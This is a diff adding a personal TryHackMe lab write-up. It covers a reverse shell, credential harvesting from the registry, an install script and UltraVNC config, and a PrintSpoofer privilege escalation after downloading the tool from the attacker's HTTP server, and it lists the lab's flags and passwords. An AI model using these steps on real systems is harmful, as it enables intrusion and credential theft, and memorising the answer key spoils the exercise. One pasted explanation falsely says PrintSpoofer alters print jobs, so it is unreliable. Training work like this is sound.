@@ -475,3 +475,481 @@ SOCKET: Shell has connected! PID: 5576
 whoami
 ft Windows [Version 10.0.18362.1256]
 (c) 2019 Microsoft Corporation. All rights reserved.
+
+C:\xampp\htdocs\images>whoami
+
+esktop-997gg7d\sign
+
+C:\xampp\htdocs\images>
+C:\xampp\htdocs\images>quser
+ USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
+ sign                  console             1  Active      none   23/01/2023 22:10
+
+C:\xampp\htdocs\images>net share
+
+Share name   Resource                        Remark
+
+-------------------------------------------------------------------------------
+C$           C:\                             Default share                     
+images$      C:\xampp\htdocs\images          Caching disabled
+Installs$    C:\Installs                     Caching disabled
+IPC$                                         Remote IPC                        
+ADMIN$       C:\Windows                      Remote Admin                      
+Users        C:\Users                        
+The command completed successfully.
+
+C:\xampp\htdocs\images>cd C:\users
+
+C:\Users>dir
+ Volume in drive C has no label.
+ Volume Serial Number is 481F-824B
+
+ Directory of C:\Users
+
+14/11/2020  15:35    <DIR>          .
+14/11/2020  15:35    <DIR>          ..
+14/11/2020  14:11    <DIR>          Administrator
+14/11/2020  13:14    <DIR>          Public
+26/01/2021  18:19    <DIR>          sign
+               0 File(s)              0 bytes
+               5 Dir(s)  16,941,297,664 bytes free
+
+C:\Users>cd sign
+
+C:\Users\sign>dir
+ Volume in drive C has no label.
+ Volume Serial Number is 481F-824B
+
+ Directory of C:\Users\sign
+
+26/01/2021  18:19    <DIR>          .
+26/01/2021  18:19    <DIR>          ..
+26/01/2021  18:28    <DIR>          3D Objects
+26/01/2021  18:28    <DIR>          Contacts
+26/01/2021  18:28    <DIR>          Desktop
+26/01/2021  18:28    <DIR>          Documents
+26/01/2021  18:28    <DIR>          Downloads
+26/01/2021  18:28    <DIR>          Favorites
+26/01/2021  18:28    <DIR>          Links
+26/01/2021  18:28    <DIR>          Music
+01/02/2021  16:23    <DIR>          OneDrive
+26/01/2021  18:28    <DIR>          Pictures
+26/01/2021  18:28    <DIR>          Saved Games
+26/01/2021  18:28    <DIR>          Searches
+26/01/2021  18:28    <DIR>          Videos
+               0 File(s)              0 bytes
+              15 Dir(s)  16,941,297,664 bytes free
+
+C:\Users\sign>cd Desktop
+
+C:\Users\sign\Desktop>dir
+ Volume in drive C has no label.
+ Volume Serial Number is 481F-824B
+
+ Directory of C:\Users\sign\Desktop
+
+26/01/2021  18:28    <DIR>          .
+26/01/2021  18:28    <DIR>          ..
+14/11/2020  13:15             1,446 Microsoft Edge.lnk
+14/11/2020  14:32                52 user_flag.txt
+               2 File(s)          1,498 bytes
+               2 Dir(s)  16,941,293,568 bytes free
+
+C:\Users\sign\Desktop>type user_flag.txt
+thm{48u51n9_5y573m_func710n4117y_f02_fun_4nd_p20f17}
+```
+How many TCP ports under 1024 are open?
+*6*
+What is the hidden share where images should be copied to?
+Hidden shares in windows end up with a certain symbol
+*images$*
+
+## Exploitation
+Gain a foothold on the box using what you found through enumeration.
+Answer the questions below
+What user is signed into the console session?
+*sign*
+What hidden, non-standard share is only remotely accessible as an administrative account?
+*Installs$*
+What is the content of user_flag.txt?
+On the users desktop
+### Pwnage
+Find the passwords and Admin Flag
+Answer the questions below
+```powershell
+C:\Users\sign\Desktop>powershell
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Try the new cross-platform PowerShell https://aka.ms/pscore6
+
+PS C:\Users\sign\Desktop> reg query "HKLM\SOFTWARE\microsoft\windows nt\currentversion\winlogon"
+
+HKEY_LOCAL_MACHINE\SOFTWARE\microsoft\windows nt\currentversion\winlogon
+    AutoRestartShell    REG_DWORD    0x1
+    Background    REG_SZ    0 0 0
+    CachedLogonsCount    REG_SZ    10
+    DebugServerCommand    REG_SZ    no
+    DisableBackButton    REG_DWORD    0x1
+    EnableSIHostIntegration    REG_DWORD    0x1
+    ForceUnlockLogon    REG_DWORD    0x0
+    LegalNoticeCaption    REG_SZ    
+    LegalNoticeText    REG_SZ    
+    PasswordExpiryWarning    REG_DWORD    0x5
+    PowerdownAfterShutdown    REG_SZ    0
+    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
+    ReportBootOk    REG_SZ    1
+    Shell    REG_SZ    explorer.exe
+    ShellCritical    REG_DWORD    0x0
+    ShellInfrastructure    REG_SZ    sihost.exe
+    SiHostCritical    REG_DWORD    0x0
+    SiHostReadyTimeOut    REG_DWORD    0x0
+    SiHostRestartCountLimit    REG_DWORD    0x0
+    SiHostRestartTimeGap    REG_DWORD    0x0
+    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
+    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
+    WinStationsDisabled    REG_SZ    0
+    scremoveoption    REG_SZ    0
+    DisableCAD    REG_DWORD    0x1
+    LastLogOffEndTimePerfCounter    REG_QWORD    0x18054b5f1
+    ShutdownFlags    REG_DWORD    0x13
+    DisableLockWorkstation    REG_DWORD    0x0
+    EnableFirstLogonAnimation    REG_DWORD    0x1
+    AutoLogonSID    REG_SZ    S-1-5-21-201290883-77286733-747258586-1001
+    LastUsedUsername    REG_SZ    .\sign
+    DefaultUsername    REG_SZ    .\sign
+    DefaultPassword    REG_SZ    gKY1uxHLuU1zzlI4wwdAcKUw35TPMdv7PAEE5dAFbV2NxpPJVO7eeSH
+    AutoAdminLogon    REG_DWORD    0x1
+    ARSOUserConsent    REG_DWORD    0x0
+
+HKEY_LOCAL_MACHINE\SOFTWARE\microsoft\windows nt\currentversion\winlogon\AlternateShells
+HKEY_LOCAL_MACHINE\SOFTWARE\microsoft\windows nt\currentversion\winlogon\GPExtensions
+HKEY_LOCAL_MACHINE\SOFTWARE\microsoft\windows nt\currentversion\winlogon\UserDefaults
+HKEY_LOCAL_MACHINE\SOFTWARE\microsoft\windows nt\currentversion\winlogon\AutoLogonChecked
+HKEY_LOCAL_MACHINE\SOFTWARE\microsoft\windows nt\currentversion\winlogon\VolatileUserMgrKey
+
+This key contains settings related to the Windows logon process.
+
+In PowerShell, the "gc" (or "get-content") command is used to retrieve the contents of a text file. For example, if you want to view the contents of a file called "example.txt" you would use the following command:
+
+`gc example.txt`
+
+This command will display the contents of the file in the PowerShell console. Additionally, you can save the output of the "gc" command to a variable, so that you can manipulate the contents of the file in your script.
+
+`$fileContent = gc example.txt`
+
+You can also use wildcards to specify multiple files and even use it with pipes to filter the output
+
+`gc .\*.log | Where-Object {$_ -like "*error*"}`
+
+PS C:\Users\sign\Desktop> cd C:\installs
+PS C:\installs> dir
+
+    Directory: C:\installs
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----       14/11/2020     14:28                simepleslide                                                          
+-a----       14/11/2020     15:40            548 Install Guide.txt                                                     
+-a----       14/11/2020     15:19            800 Install_www_and_deploy.bat                                            
+-a----       14/11/2020     13:59         339096 PsExec.exe                                                            
+-a----       14/11/2020     14:01            182 simepleslide.zip                                                      
+-a----       14/11/2020     15:14            147 startup.bat                                                           
+-a----       14/11/2020     14:43           1292 ultravnc.ini                                                          
+-a----       14/11/2020     14:00        3129968 UltraVNC_1_2_40_X64_Setup.exe                                         
+-a----       14/11/2020     13:59      162450672 xampp-windows-x64-7.4.11-0-VC15-installer.exe 
+
+PS C:\installs> gc ins*.bat
+@echo off
+REM Shop Sign Install Script 
+cd C:\Installs
+psexec -accepteula -nobanner -u administrator -p RCYCc3GIjM0v98HDVJ1KOuUm4xsWUxqZabeofbbpAss9KCKpYfs2rCi xampp-windows-x64-7.4.11-0-VC15-installer.exe   --disable-components xampp_mysql,xampp_filezilla,xampp_mercury,xampp_tomcat,xampp_perl,xampp_phpmyadmin,xampp_webalizer,xampp_sendmail --mode unattended --launchapps 1
+xcopy C:\Installs\simepleslide\src\* C:\xampp\htdocs\
+move C:\xampp\htdocs\index.php C:\xampp\htdocs\index.php_orig
+copy C:\Installs\simepleslide\src\slide.html C:\xampp\htdocs\index.html
+mkdir C:\xampp\htdocs\images
+UltraVNC_1_2_40_X64_Setup.exe /silent
+copy ultravnc.ini "C:\Program Files\uvnc bvba\UltraVNC\ultravnc.ini" /y
+copy startup.bat "c:\programdata\Microsoft\Windows\Start Menu\Programs\Startup\"
+pause
+
+PS C:\installs> gc ul*.ini
+[ultravnc]
+passwd=B3A8F2D8BEA2F1FA70
+passwd2=5AB2CDC0BADCAF13F1
+[admin]
+UseRegistry=0
+SendExtraMouse=1
+Secure=0
+MSLogonRequired=0
+NewMSLogon=0
+DebugMode=0
+Avilog=0
+path=C:\Program Files\uvnc bvba\UltraVNC
+accept_reject_mesg=
+DebugLevel=0
+DisableTrayIcon=0
+rdpmode=0
+noscreensaver=0
+LoopbackOnly=0
+UseDSMPlugin=0
+AllowLoopback=1
+AuthRequired=1
+ConnectPriority=1
+DSMPlugin=
+AuthHosts=
+DSMPluginConfig=
+AllowShutdown=1
+AllowProperties=1
+AllowInjection=0
+AllowEditClients=1
+FileTransferEnabled=0
+FTUserImpersonation=1
+BlankMonitorEnabled=1
+BlankInputsOnly=0
+DefaultScale=1
+primary=1
+secondary=0
+SocketConnect=1
+HTTPConnect=1
+AutoPortSelect=1
+PortNumber=5900
+HTTPPortNumber=5800
+IdleTimeout=0
+IdleInputTimeout=0
+RemoveWallpaper=0
+RemoveAero=0
+QuerySetting=2
+QueryTimeout=10
+QueryDisableTime=0
+QueryAccept=0
+QueryIfNoLogon=1
+InputsEnabled=1
+LockSetting=0
+LocalInputsDisabled=0
+EnableJapInput=0
+EnableUnicodeInput=0
+EnableWin8Helper=0
+kickrdp=0
+clearconsole=0
+[admin_auth]
+group1=
+group2=
+group3=
+locdom1=0
+locdom2=0
+locdom3=0
+[poll]
+TurboMode=1
+PollUnderCursor=0
+PollForeground=0
+PollFullScreen=1
+OnlyPollConsole=0
+OnlyPollOnEvent=0
+MaxCpu=40
+EnableDriver=0
+EnableHook=1
+EnableVirtual=0
+SingleWindow=0
+SingleWindowName=
+
+http://aluigi.altervista.org/pwdrec.htm
+
+http://aluigi.altervista.org/pwdrec/vncpwd.zip
+```
+```powershell
+┌──(kali㉿kali)-[~/Downloads]
+└─$ mkdir ultraVNC_decrypt
+```
+```powershell
+┌──(kali㉿kali)-[~/Downloads]
+└─$ mv vncpwd.zip ultraVNC_decrypt
+```
+```powershell
+┌──(kali㉿kali)-[~/Downloads/ultraVNC_decrypt]
+└─$ unzip vncpwd.zip 
+Archive:  vncpwd.zip
+  inflating: d3des.c                 
+  inflating: d3des.h                 
+  inflating: vncpwd.c                
+  inflating: vncpwd.exe
+```
+```powershell
+┌──(kali㉿kali)-[~/Downloads/ultraVNC_decrypt]
+└─$ ls
+d3des.c  d3des.h  vncpwd.c  vncpwd.exe  vncpwd.zip
+```
+```powershell
+┌──(kali㉿kali)-[~/Downloads/ultraVNC_decrypt]
+└─$ python3 -m http.server 8000 
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.184.245 - - [23/Jan/2023 18:25:03] "GET /vncpwd.exe HTTP/1.1" 200 -
+
+PS C:\installs> Invoke-WebRequest "http://10.8.19.103:8000/vncpwd.exe" -outfile vncpwd.exe
+
+PS C:\Installs> ./vncpwd.exe ultravnc.ini
+
+*VNC password decoder 0.2.1
+by Luigi Auriemma
+e-mail: aluigi@autistici.org
+web:    aluigi.org
+
+  Password:   5upp0rt9
+  Password:   
+
+  Press RETURN to exit
+
+or another way
+```
+```powershell
+┌──(kali㉿kali)-[~/Downloads/ultraVNC_decrypt]
+└─$ wine vncpwd.exe B3A8F2D8BEA2F1FA70
+
+*VNC password decoder 0.2.1
+by Luigi Auriemma
+e-mail: aluigi@autistici.org
+web:    aluigi.org
+
+- your input password seems in hex format (or 
+longer than 8 chars)
+
+  Password:   5upp0rt9
+
+  Press RETURN to exit
+
+Wine is a compatibility layer that allows Windows applications to run on Linux and other Unix-like operating systems. The command you provided is using Wine to run the "vncpwd.exe" application, and passing it the argument "B3A8F2D8BEA2F1FA70". This is likely a VNC (Virtual Network Computing) password that is being passed to the "vncpwd.exe" application in order to be decrypted.
+
+──(kali㉿kali)-[~/Downloads]
+└─$ xfreerdp /v:10.10.77.222 /u:Administrator /p:5upp0rt9 /cert:ignore +clipboard /dynamic-resolution /drive:share,/tmp /size:85%
+[18:45:24:434] [2314355:2314356] [WARN][com.freerdp.core.nla] - SPNEGO received NTSTATUS: STATUS_LOGON_FAILURE [0xC000006D] from server
+[18:45:24:434] [2314355:2314356] [ERROR][com.freerdp.core] - nla_recv_pdu:freerdp_set_last_error_ex ERRCONNECT_LOGON_FAILURE [0x00020014]
+[18:45:24:434] [2314355:2314356] [ERROR][com.freerdp.core.rdp] - rdp_recv_callback: CONNECTION_STATE_NLA - nla_recv_pdu() fail
+[18:45:24:434] [2314355:2314356] [ERROR][com.freerdp.core.transport] - transport_check_fds: transport->ReceiveCallback() - -1
+```
+```powershell
+┌──(kali㉿kali)-[~/Downloads]
+└─$ evil-winrm -i 10.10.77.222 -u Administrator -p 5upp0rt9
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+Error: An error of type Errno::ECONNREFUSED happened, message is Connection refused - Connection refused - connect(2) for "10.10.77.222" port 5985 (10.10.77.222:5985)
+
+Error: Exiting with code 1
+```
+
+## Privilege Escalation
+```powershell
+┌──(kali㉿kali)-[~/Downloads]
+└─$ xvncviewer 10.10.77.222
+Connected to RFB server, using protocol version 3.8
+Performing standard VNC authentication
+Password: 
+Authentication successful
+Desktop name "desktop-997gg7d ( 10.10.77.222 ) - service mode"
+VNC server default format:
+  32 bits per pixel.
+  Least significant byte first in each pixel.
+  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
+Using default colormap which is TrueColor.  Pixel format:
+  32 bits per pixel.
+  Least significant byte first in each pixel.
+  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
+
+uhmm slow
+
+PS C:\Installs> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeShutdownPrivilege           Shut down the system                      Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeUndockPrivilege             Remove computer from docking station      Disabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+SeTimeZonePrivilege           Change the time zone                      Disabled
+```
+```powershell
+┌──(kali㉿kali)-[~/Downloads/ultraVNC_decrypt]
+└─$ locate PrintSpoof
+/home/kali/ra2/PrintSpoofer.exe
+/home/kali/skynet/daily_bugle/PrintSpoofer.exe
+```
+```powershell
+┌──(kali㉿kali)-[~/Downloads/ultraVNC_decrypt]
+└─$ cp /home/kali/ra2/PrintSpoofer.exe PrintSpoofer.exe
+```
+```powershell
+┌──(kali㉿kali)-[~/Downloads/ultraVNC_decrypt]
+└─$ python3 -m http.server 8000                        
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.77.222 - - [23/Jan/2023 19:02:26] "GET /PrintSpoofer.exe HTTP/1.1" 200 -
+
+PS C:\Installs> Invoke-WebRequest "http://10.8.19.103:8000/PrintSpoofer.exe" -outfile PrintSpoofer.exe
+
+PS C:\Installs> ./PrintSpoofer.exe -i -c cmd
+[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...
+[+] CreateProcessAsUser() OK
+Microsoft Windows [Version 10.0.18362.1256]
+(c) 2019 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>cd C:\Users\Administrator\Desktop
+
+C:\Users\Administrator\Desktop>dir
+ Volume in drive C has no label.
+ Volume Serial Number is 481F-824B
+
+ Directory of C:\Users\Administrator\Desktop
+
+11/14/2020  02:32 PM    <DIR>          .
+11/14/2020  02:32 PM    <DIR>          ..
+11/14/2020  02:31 PM                54 admin_flag.txt
+               1 File(s)             54 bytes
+               2 Dir(s)  16,909,467,648 bytes free
+
+C:\Users\Administrator\Desktop>type admin_flag.txt
+thm{p455w02d_c4n_83_f0und_1n_p141n_73x7_4dm1n_5c21p75}
+
+The command you provided is using PowerShell on Windows to execute the "PrintSpoofer.exe" file with the "-i" and "-c" options. The "-i" option is likely used to specify an interactive mode, and the "-c" option is likely used to specify a command that should be executed. In this case, the command specified is "cmd" which opens the Command Prompt.
+
+It is important to note that this command is running a file called PrintSpoofer.exe, which is a tool that is able to change the content of print jobs in real-time. It is often used by pentesters or attackers to change the output of a document, it could be dangerous and it's important to know what it does and what are the consequences of running it before actually doing so.
+
+:)
+```
+What is the Users Password?
+The user is automatically logged into the computer
+*gKY1uxHLuU1zzlI4wwdAcKUw35TPMdv7PAEE5dAFbV2NxpPJVO7eeSH*
+What is the Administrators Password?
+*RCYCc3GIjM0v98HDVJ1KOuUm4xsWUxqZabeofbbpAss9KCKpYfs2rCi*
+What executable is used to run the installer with the Administrator username and password?
+CaSesensitive.exe
+*PsExec.exe*
+What is the VNC Password?
+There are a few versions but some do not work. The version here is known to work: http://aluigi.altervista.org/pwdrec.htm
+*5upp0rt9*
+![[Pasted image 20230123185003.png]]
+What is the contents of the admin_flag.txt?
+On the users desktop
+### Finishing Up
+There are many ways and tools to complete this room and Windows Defender does add to the fun (?). kudo's if you managed to deploy a payload that evaded Defender to get a shell. Hopefully running through this box you have learnt something that you can use in future.
+I would like to thank [BigMark82](https://tryhackme.com/p/bigmark82) and [RockShox](https://tryhackme.com/p/RockShox) my partners in crime. Also a shout out to [elbee](https://tryhackme.com/p/elbee) for encouraging me to make a room, check out their room [StartUp](https://tryhackme.com/room/startup) which was fun to do.
+Answer the questions below
+READ IT
+
+## Flags / Answers
+- ***thm{48u51n9_5y573m_func710n4117y_f02_fun_4nd_p20f17}***
+- ***thm{p455w02d_c4n_83_f0und_1n_p141n_73x7_4dm1n_5c21p75}***
+
+## Notes / Lessons Learned
+[[OWASP API Security Top 10 - 1]]
+
